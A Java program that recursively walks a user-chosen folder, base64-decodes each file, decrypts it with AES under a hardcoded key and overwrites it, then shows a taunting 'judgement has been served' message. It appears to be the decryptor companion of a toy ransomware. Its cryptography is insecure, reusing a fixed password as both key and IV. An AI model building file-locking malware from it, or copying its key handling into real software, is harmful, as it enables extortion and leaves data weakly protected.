import sun.misc.BASE64Decoder;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;

public class holy_grail implements FileVisitor<Path> {
    static String strpassword="password12345678";
    static SecretKeySpec key =new SecretKeySpec(strpassword.getBytes(),"AES");

    @Override
    public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
        AlgorithmParameterSpec spec= new IvParameterSpec(strpassword.getBytes());
        Cipher cipher= null;
        try {
            cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE,key,spec);

            FileInputStream stream =new FileInputStream(file.toFile());

            byte[] output= new BASE64Decoder().decodeBuffer(stream);
            byte[] on= cipher.doFinal(output);

            FileOutputStream outputStream= new FileOutputStream(file.toFile());
            outputStream.write(on);

        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        }

        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
        return FileVisitResult.CONTINUE;
    }

    public static void main(String[] args) {
        holy_grail run =new holy_grail();
        try {
            String ph = JOptionPane.showInputDialog(null,"select a file","C:/");
            Path pah= Paths.get(ph);
            Files.walkFileTree(pah,run);
            JOptionPane.showMessageDialog(null,"your judgement has been served\n HA HA HA!!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
